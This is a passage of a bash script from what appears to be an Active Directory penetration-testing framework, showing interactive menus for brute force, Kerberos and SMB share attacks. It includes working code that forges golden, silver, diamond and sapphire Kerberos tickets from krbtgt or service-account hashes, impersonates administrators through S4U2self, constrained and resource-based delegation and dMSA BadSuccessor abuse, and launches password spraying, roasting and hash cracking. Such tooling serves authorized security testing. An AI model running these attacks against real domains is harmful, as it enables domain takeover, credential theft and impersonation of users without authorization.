    echo -e "${CYAN}[BruteForce menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) BRUTEFORCE ATTACKS #1-2-3-5-10"
    else
        echo -e "A) BRUTEFORCE ATTACKS #3-5-10"
    fi
    echo -e "1) RID Brute Force (Null session) using netexec"
    echo -e "2) User Enumeration using kerbrute (Null session)"
    echo -e "3) User=Pass check using kerbrute (Noisy!)"
    echo -e "4) User=Pass check using netexec (Noisy!)"
    echo -e "5) Identify Pre-Created Computer Accounts using netexec (Noisy!)"
    echo -e "6) Pre2k computers authentication check (Noisy!)"
    echo -e "7) User Enumeration using ldapnomnom (Null session)"
    echo -e "8) Password spraying using kerbrute (Noisy!)"
    echo -e "9) Password spraying using netexec - ldap (Noisy!)"
    echo -e "10) Timeroast attack against NTP"
    echo -e "11) MSSQL RID Brute Force (Null session) using netexec"
    echo -e "12) Open SpearSpray console"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        bruteforce
        bruteforce_menu
        ;;

    1)
        ridbrute_attack
        bruteforce_menu
        ;;

    2)
        kerbrute_enum
        bruteforce_menu
        ;;

    3)
        userpass_kerbrute_check
        bruteforce_menu
        ;;

    4)
        userpass_ne_check
        bruteforce_menu
        ;;

    5)
        ne_pre2k
        bruteforce_menu
        ;;

    6)
        pre2k_check
        bruteforce_menu
        ;;

    7)
        ldapnomnom_enum
        bruteforce_menu
        ;;

    8)
        kerbrute_passpray
        bruteforce_menu
        ;;

    9)
        ne_passpray
        bruteforce_menu
        ;;

    10)
        ne_timeroast
        bruteforce_menu
        ;;

    11)
        mssql_ridbrute_attack
        bruteforce_menu
        ;;

    12)
        spearspray_console
        bruteforce_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        bruteforce_menu
        ;;
    esac
}

kerberos_menu() {
    mkdir -p "${Kerberos_dir}"
    echo -e ""
    echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) KERBEROS ATTACKS #1-2-3-4-7"
    else
        echo -e "A) KERBEROS ATTACKS #1-2-3-4-5-6"
    fi
    echo -e "1) AS REP Roasting Attack using GetNPUsers"
    echo -e "2) Kerberoast Attack using GetUserSPNs"
    echo -e "3) Cracking AS REP Roast hashes using john the ripper"
    echo -e "4) Cracking Kerberoast hashes using john the ripper"
    echo -e "5) NoPac check using netexec (only on DC)"
    echo -e "6) MS14-068 check (only on DC)"
    echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
    echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
    echo -e "9) Run custom Kerberoast attack using Orpheus"
    echo -e "10) Request TGS for current user (requires: authenticated)"
    echo -e "11) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)"
    echo -e "12) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)"
    echo -e "13) Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')"
    echo -e "14) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)"
    echo -e "15) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)"
    echo -e "16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
    echo -e "17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')"
    echo -e "18) Request impersonated ticket using Resource-Based Constrained Delegation rights (requires: authenticated session of SPN account allowed for RBCD)"
    echo -e "19) Request TGS impersonated ticket using dMSA to exploit BadSuccessor (requires: authenticated session of account with BadSuccessor privileges)"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        kerberos
        kerberos_menu
        ;;

    1)
        asrep_attack
        kerberos_menu
        ;;

    2)
        kerberoast_attack
        kerberos_menu
        ;;

    3)
        john_crack_asrep
        kerberos_menu
        ;;

    4)
        john_crack_kerberoast
        kerberos_menu
        ;;

    5)
        nopac_check
        kerberos_menu
        ;;

    6)
        ms14-068_check
        kerberos_menu
        ;;

    7)
        asreprc4_attack
        kerberos_menu
        ;;

    8)
        krbjack_attack
        kerberos_menu
        ;;

    9)
        kerborpheus_attack
        kerberos_menu
        ;;

    10)
        if ! stat "${impacket_getST}" >/dev/null 2>&1; then
            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
            else
                tick_spn="CIFS/${dc_FQDN}"
                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_FQDN}):${NC}"
                read -rp ">> " tick_spn_value </dev/tty
                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_getST} ${argument_imp} -dc-ip ${dc_ip} -spn ${tick_spn}" | tee -a "${Credentials_dir}/getST_output_${user_var}"
                ticket_ccache_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                ticket_kirbi_out="${user}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
                    echo -e "${GREEN}[+] TGS for SPN ${tick_spn} generated successfully:${NC}"
                    echo -e "'${Credentials_dir}/${ticket_ccache_out}'"
                    echo -e "'${Credentials_dir}/${ticket_kirbi_out}'"
                else
                    echo -e "${RED}[-] Failed to request ticket${NC}"
                fi
                cd "${current_dir}" || exit
            fi

        fi
        kerberos_menu
        ;;
    
    11)
        if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
            read -rp ">> " rc4_or_aes </dev/tty
            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
                read -rp ">> " rc4_or_aes </dev/tty
            done
            gethash_user="krbtgt"
            gethash_hash=""
            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}"
            read -rp ">> " gethash_hash </dev/tty
            if [[ ${gethash_hash} == "" ]]; then
                get_hash
            else
                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt="$gethash_hash"; else gethash_aes="$gethash_hash"; fi
            fi

            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
            else
                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi

                tick_randuser="Administrator"
                tick_user_id=""
                tick_groups=""
                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify custom user id (press Enter to skip):${NC}"
                read -rp ">> " tick_user_id_value </dev/tty
                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
                echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to skip):${NC}"
                echo -e "${CYAN}[*] Example: 512,513,518,519,520 ${NC}"
                read -rp ">> " tick_group_ids_value </dev/tty
                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
                get_domain_sid
                while [[ "${sid_domain}" == "" ]]; do
                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                    echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
                    read -rp ">> " sid_domain </dev/tty
                done
                echo -e "${CYAN}[*] Generating golden ticket...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
                if stat "${Credentials_dir}/${tick_randuser}.ccache" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${tick_randuser}.ccache' './${tick_randuser}.kirbi'"
                    echo -e "${GREEN}[+] Golden ticket generated successfully:${NC}"
                    echo -e "${Credentials_dir}/${tick_randuser}_golden.ccache"
                    echo -e "${Credentials_dir}/${tick_randuser}_golden.kirbi"
                else
                    echo -e "${RED}[-] Failed to generate golden ticket${NC}"
                fi
                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
                /bin/mv "./${tick_randuser}.kirbi" "./${tick_randuser}_golden.kirbi" 2>/dev/null
                cd "${current_dir}" || exit
            fi
        fi
        kerberos_menu
        ;;

    12)
        if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            tick_randuser="Administrator"
            tick_randuserid=""
            tick_spn="CIFS/${dc_domain}"
            tick_groups=""
            tick_servuser=""

            echo -e "${BLUE}[*] Please specify name of SPN account (Example: 'sql_svc'):${NC}"
            read -rp ">> " tick_servuser </dev/tty
            while [[ "${tick_servuser}" == "" ]]; do
                echo -e "${RED}Invalid username.${NC} Please specify another:"
                read -rp ">> " tick_servuser </dev/tty
            done

            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}"
            read -rp ">> " rc4_or_aes </dev/tty
            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
                read -rp ">> " rc4_or_aes </dev/tty
            done
            gethash_hash=""
            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}"
            read -rp ">> " gethash_hash </dev/tty
            if [[ ${gethash_hash} == "" ]]; then
                gethash_user=$tick_servuser
                get_hash
            else
                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
            fi

            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
            else
                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi

                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify the chosen user's ID (press Enter to choose default value EMPTY):${NC}"
                read -rp ">> " tick_randuserid_value </dev/tty
                if [[ ! "${tick_randuserid_value}" == "" ]]; then tick_randuserid="-user-id ${tick_randuserid_value}"; fi
                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):${NC}"
                read -rp ">> " tick_spn_value </dev/tty
                if [[ ! "${tick_spn_value}" == "" ]]; then tick_spn="${tick_spn_value}"; fi
                get_domain_sid
                while [[ "${sid_domain}" == "" ]]; do
                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                    echo -e "${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}"
                    read -rp ">> " sid_domain </dev/tty
                done
                echo -e "${CYAN}[*] Generating silver ticket for service ${tick_spn}...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}"
                ticket_ccache_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').ccache"
                ticket_kirbi_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').kirbi"
                if stat "${Credentials_dir}/${tick_randuser}.ccache" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${tick_randuser}.ccache' './${tick_randuser}.kirbi'"
                    echo -e "${GREEN}[+] Silver ticket generated successfully:${NC}"
                    echo -e "${Credentials_dir}/${ticket_ccache_out}"
                    echo -e "${Credentials_dir}/${ticket_kirbi_out}"
                else
                    echo -e "${RED}[-] Failed to generate silver ticket${NC}"
                fi
                /bin/mv "./${tick_randuser}.ccache" "./${ticket_ccache_out}" 2>/dev/null
                /bin/mv "./${tick_randuser}.kirbi" "./${ticket_kirbi_out}" 2>/dev/null
                cd "${current_dir}" || exit
            fi
        fi
        kerberos_menu
        ;;

    13)
        if ! stat "${impacket_getST}" >/dev/null 2>&1; then
            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
            else
                tick_randuser="Administrator"
                tick_spn="CIFS/${dc_domain}"

                echo -e "${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):${NC}"
                read -rp ">> " tick_spn_value </dev/tty
                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_getST} ${argument_imp} -self -impersonate ${tick_randuser} -dc-ip ${dc_ip} -altservice ${tick_spn}" | tee -a "${Credentials_dir}/getST_output_${user_var}"
                ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
                    echo -e "${GREEN}[+] TGS for SPN ${tick_spn} impersonating ${tick_randuser} generated successfully:${NC} $krb_ticket"
                    echo -e "${Credentials_dir}/${ticket_ccache_out}"
                    echo -e "${Credentials_dir}/${ticket_kirbi_out}"
                else
                    echo -e "${RED}[-] Failed to request ticket${NC}"
                fi
                cd "${current_dir}" || exit
            fi
        fi
        kerberos_menu
        ;;

    14)
        if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}"
            read -rp ">> " rc4_or_aes </dev/tty
            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
                read -rp ">> " rc4_or_aes </dev/tty
            done
            gethash_user="krbtgt"
            gethash_hash=""
            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}"
            read -rp ">> " gethash_hash </dev/tty
            if [[ ${gethash_hash} == "" ]]; then
                get_hash
            else
                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
            fi

            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
            else
                gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
                tick_randuser="sql_svc"
                tick_user_id="1337"
                tick_groups="512,513,518,519,520"
                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! "${tick_randuser_value}" == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):${NC}"
                read -rp ">> " tick_user_id_value </dev/tty
                if [[ ! "${tick_user_id_value}" == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
                echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):${NC}"
                read -rp ">> " tick_group_ids_value </dev/tty
                if [[ ! "${tick_group_ids_value}" == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
                get_domain_sid
                while [[ "${sid_domain}" == "" ]]; do
                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                    read -rp ">> " sid_domain </dev/tty
                done
                echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
                cd "${current_dir}" || exit
                if stat "${Credentials_dir}/${tick_randuser}_diamond.ccache" >/dev/null 2>&1; then
                    echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${Credentials_dir}/${tick_randuser}_diamond.ccache"
                else
                    echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
                fi
            fi
        fi
        kerberos_menu
        ;;

    15)
        if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}"
            read -rp ">> " rc4_or_aes </dev/tty
            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
                read -rp ">> " rc4_or_aes </dev/tty
            done
            gethash_user="krbtgt"
            gethash_hash=""
            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}"
            read -rp ">> " gethash_hash </dev/tty
            if [[ ${gethash_hash} == "" ]]; then
                get_hash
            else
                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
            fi

            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
            else
                gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
                tick_randuser="sql_svc"
                tick_user_id="1337"
                tick_groups="512,513,518,519,520"
                tick_domain_admin="${user}"
                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):${NC}"
                read -rp ">> " tick_user_id_value </dev/tty
                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
                echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):${NC}"
                read -rp ">> " tick_group_ids_value </dev/tty
                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
                echo -e "${BLUE}[*] Please specify domain admin to impersonate (press Enter to choose default value current user):${NC}"
                read -rp ">> " tick_domain_admin_value </dev/tty
                if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
                get_domain_sid
                while [[ "${sid_domain}" == "" ]]; do
                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                    read -rp ">> " sid_domain </dev/tty
                done
                echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
                cd "${current_dir}" || exit
                if stat "${Credentials_dir}/${tick_randuser}_sapphire.ccache" >/dev/null 2>&1; then
                    echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${Credentials_dir}/${tick_randuser}_sapphire.ccache"
                else
                    echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
                fi
            fi
        fi
        kerberos_menu
        ;;

    16)
        raise_child
        kerberos_menu
        ;;

    17)
        if ! stat "${impacket_getST}" >/dev/null 2>&1; then
            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
            else
                tick_randuser="Administrator"
                tick_spn="CIFS/${dc_domain}"

                echo -e "${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):${NC}"
                read -rp ">> " tick_spn_value </dev/tty
                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser} -dc-ip ${dc_ip}"
                ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
                    echo -e "${GREEN}[+] Delegated ticket successfully requested :${NC}"
                    echo -e "${Credentials_dir}/${ticket_ccache_out}"
                    echo -e "${Credentials_dir}/${ticket_kirbi_out}"
                else
                    echo -e "${RED}[-] Failed to request ticket${NC}"
                fi
                cd "${current_dir}" || exit
            fi
        fi
        kerberos_menu
        ;;

    18)
        if ! stat "${impacket_getST}" >/dev/null 2>&1; then
            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
            else
                tick_randuser="Administrator"
                tick_spn="CIFS/${dc_FQDN}"

                echo -e "${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):${NC}"
                read -rp ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "${BLUE}[*] Please specify spn of RBCD target (press Enter to choose default value CIFS/${dc_FQDN}):${NC}"
                read -rp ">> " tick_spn_value </dev/tty
                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser} -dc-ip ${dc_ip}"
                ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
                ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
                    echo -e "${GREEN}[+] RBCD Delegated ticket successfully requested :${NC}"
                    echo -e "${Credentials_dir}/${ticket_ccache_out}"
                    echo -e "${Credentials_dir}/${ticket_kirbi_out}"
                else
                    echo -e "${RED}[-] Failed to request ticket${NC}"
                fi
                cd "${current_dir}" || exit
            fi
        fi
        kerberos_menu
        ;;

    19)
        if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
            krb_ticket="${Credentials_dir}/${user}"
            run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
            if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
            elif [ "${noexec_bool}" == "false" ]; then
                echo -e "${RED}[-] Failed to generate TGT${NC}"
            fi
        else
            krb_ticket="${Credentials_dir}/${user}"
            echo -e "${PURPLE}[-] Using Kerberos authentication! Skipping generation of TGT...${NC}"
        fi

        if ! stat "${impacket_getST}" >/dev/null 2>&1; then
            echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
            else
                dmsa_account=""
                echo -e "${BLUE}[*] Please specify dMSA account name:${NC}"
                echo -e "${CYAN}[*] Example: bad_DMSA${NC}"
                read -rp ">> " dmsa_account </dev/tty
                while [[ "${dmsa_account}" == "" ]]; do
                    echo -e "${RED}Invalid name.${NC} Please specify dMSA account name:"
                    read -rp ">> " dmsa_account </dev/tty
                done
                echo -e "${CYAN}[*] Requesting dMSA impersonation ticket${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "KRB5CCNAME=${krb_ticket}.ccache ${impacket_getST} ${domain}/${user}@${dc_FQDN} -k -no-pass -dc-ip ${dc_ip} -impersonate '${dmsa_account}$' -self -dmsa" | tee -a "${Credentials_dir}/getST_dmsa_output_${user_var}"
                ticket_ccache_out="${dmsa_account}\$@krbtgt_${dc_domain^^}@${dc_domain^^}.ccache"
                ticket_kirbi_out="${dmsa_account}\$@krbtgt_${dc_domain^^}@${dc_domain^^}.kirbi"
                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
                    run_command "${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'"
                    echo -e "${GREEN}[+] TGS impersonating ${dmsa_account} generated successfully:${NC}"
                    echo -e "'${Credentials_dir}/${ticket_ccache_out}'"
                    echo -e "'${Credentials_dir}/${ticket_kirbi_out}'"
                else
                    echo -e "${RED}[-] Failed to request ticket${NC}"
                fi
                cd "${current_dir}" || exit
            fi
        fi
        kerberos_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        kerberos_menu
        ;;
    esac
}

shares_menu() {
    mkdir -p "${Shares_dir}"
    echo -e ""
    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
    echo -e "A) SMB SHARES SCANS #2-3-4"
    echo -e "m) Modify target(s)"
    echo -e "1) SMB shares Scan using smbmap"
    echo -e "2) SMB shares Enumeration using netexec"
    echo -e "3) SMB shares Spidering using netexec "
    echo -e "4) SMB shares Scan using FindUncommonShares"
    echo -e "5) List all servers and run SMB shares Scan using FindUncommonShares"
    echo -e "6) SMB shares Scan using manspider"
    echo -e "7) SMB shares Scan using ShareHound"
    echo -e "8) SMB shares Scan using ShareHound (on all subnets)"
    echo -e "9) Open smbclient.py console on target"
    echo -e "10) Open p0dalirius's smbclientng console on target"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        scan_shares
        shares_menu
        ;;

    m)
        modify_target
        shares_menu
        ;;

    1)
        smb_map
        shares_menu
        ;;

    2)
        ne_shares
        shares_menu
        ;;

    3)
        ne_spider
        shares_menu
        ;;

    4)
        finduncshar_scan
        shares_menu
        ;;

    5)
        finduncshar_fullscan
        shares_menu
        ;;

    6)
        manspider_scan
        shares_menu
        ;;

    7)
        sharehound_scan
        shares_menu
        ;;

    8)
        sharehound_scan_allsubnets
        shares_menu
        ;;

    9)
        smbclient_console
        shares_menu
        ;;

    10)
        smbclientng_console
        shares_menu
        ;;

    back)
        main_menu
        ;;

    exit)
